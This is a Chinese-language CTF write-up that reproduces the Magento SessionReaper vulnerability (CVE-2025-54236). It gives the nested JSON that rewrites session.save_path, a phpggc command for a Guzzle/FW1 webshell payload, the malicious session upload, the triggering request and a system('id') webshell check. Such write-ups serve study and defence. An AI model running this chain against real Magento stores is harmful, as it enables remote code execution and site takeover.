# N1CTF 2025 This challenge has been ruined

## 题目简述

题目复现 Magento 的 SessionReaper 漏洞 CVE-2025-54236。入口是 Magento Web API 的递归对象转换：`ServiceInputProcessor` 会根据接口参数类型实例化嵌套对象，并在构造完成后继续调用数组中同名字段对应的 setter。旧实现没有把构造参数限制为简单类型或 API Data Object，攻击者因而可以从匿名 REST 接口一路构造到内部 Session 对象。

利用目标是控制 `Magento\Framework\Session\Config::setSavePath()`，让 PHP 从攻击者上传的目录读取指定 session 文件。文件内容是 Magento 现有依赖可触发的 PHP 反序列化 gadget，最终把 WebShell 写入 `pub/`。上游补丁新增的核心限制正是只允许简单类型和 `*\Api\Data\*` 类作为构造参数，详见 [Magento 修复提交](https://github.com/magento/magento2/commit/8075ae19428870e3b6e4b8f9e0705389328d4515)。

## 解题过程

先从补丁定位漏洞。旧版 `getConstructorData()` 会读取目标类构造函数的参数类型，并递归调用 `convertValue()`；`_createFromArray()` 实例化对象后，还会枚举输入字段并调用相应 setter。补丁增加的判断可以简化为：

```php
if (!(
    $this->typeProcessor->isTypeSimple($parameterType) ||
    preg_match('~\\\\?\w+\\\\\w+\\\\Api\\\\Data\\\\~', $parameterType) === 1
)) {
    continue;
}
```

这说明漏洞不是传统的 `unserialize($_POST)`，而是框架把攻击者 JSON 当成对象图构造说明书。只要从某个匿名 API 的参数类型出发，能沿构造函数参数或 setter 到达危险类，就可以操纵内部行为。

题目作者枚举 Web API 定义和 PHP 类型关系后，找到最短可用链：

```text
POST /rest/all/V1/guest-carts/:cartId/estimate-shipping-methods

address
  -> directoryData
    -> context
      -> urlDecoder
        -> urlBuilder
          -> session
            -> sessionConfig
              -> savePath
```

链尾的 `sessionConfig` 是 `Magento\Framework\Session\Config`。这个类虽然难以仅靠构造参数完整填充，但 `_createFromArray()` 随后会处理 setter，于是 JSON 中的 `savePath` 会调用：

```php
public function setSavePath($savePath)
{
    $this->setOption('session.save_path', $savePath);
    return $this;
}
```

当上层 `SessionManager` 构造并执行 `start()` 时，`initIniOptions()` 会把该配置写入 PHP ini，随后按照请求 Cookie 中的 `PHPSESSID` 从新目录读取 `sess_<SESSID>`。触发请求的 JSON 骨架为：

```json
{
  "address": {
    "directoryData": {
      "context": {
        "urlDecoder": {
          "urlBuilder": {
            "session": {
              "sessionConfig": {
                "savePath": "media/customer_address/s/e"
              }
            }
          }
        }
      }
    }
  }
}
```

在触发前需要先把恶意 session 放到该目录。官方 `exp.py` 用 `phpggc` 生成 Guzzle/FW1 gadget：

```bash
php ./phpggc/phpggc -se Guzzle/FW1 pub/exploit.php shell.php -o session
```

`-se` 让输出适配 PHP session 格式；gadget 的效果是把本地 `shell.php` 内容写到相对路径 `pub/exploit.php`。这里必须使用相对路径：题目是黑盒环境，无法可靠预知 Magento 的绝对安装目录，而 session 反序列化发生时工作目录允许 `pub/exploit.php` 正确落到 Web 根下。

Magento 的 `/customer/address_file/upload` 可接收客户地址自定义属性文件。构造 16 字节 `form_key` 和 26 字节小写字母数字 `SESSID`，以 multipart 方式上传：

```text
字段名：custom_attributes[country_id]
文件名：sess_<SESSID>
文件内容：phpggc 生成的 session
Cookie：form_key=<FORMKEY>
```

官方环境会把该文件保存到 `media/customer_address/s/e/`，正好与 JSON 中的 `savePath` 一致。随后带上 `PHPSESSID=<SESSID>` 请求匿名接口：

```http
POST /rest/all/V1/guest-carts/123/estimate-shipping-methods HTTP/1.1
Content-Type: application/json
Cookie: PHPSESSID=<SESSID>

{上述嵌套 JSON}
```

对象转换建立 `SessionManager`，setter 改写 `session.save_path`，`start()` 读入攻击者文件并进行 PHP session 反序列化，Guzzle/FW1 链最终写出 WebShell。官方示例的 `shell.php` 执行 GET 参数 `1` 中的 PHP 代码，因此可用以下请求验证：

```text
/exploit.php?1=system("id");
```

确认回显用户为 `www-data` 后，再通过同一入口读取 flag 即可。外部公开分析还强调了“恶意 session + REST 嵌套反序列化”这一组合；本题所需的上传位置、对象链、save path 和 gadget 细节均已在上文完整展开，无需依赖外链才能复现。

## 方法总结

本题最值得注意的是两层“反序列化”不能混为一谈。第一层是 Magento `ServiceInputProcessor` 根据类型注解递归构造 PHP 对象，它负责把 `savePath` 送到内部 Session 配置；第二层才是 PHP session handler 从攻击者目录读取文件，触发传统 gadget 链。只有第一层而没有可控 session 文件，或只有上传而不能改 `session.save_path`，都无法得到 RCE。

分析此类补丁题时，应从新增的类型限制反推攻击者原本能够控制的对象边，再以危险 setter/构造副作用为终点搜索可达路径。利用阶段还要避免依赖未知的绝对路径；官方把 WebShell 输出设为 `pub/exploit.php`，正是黑盒条件下更稳健的做法。
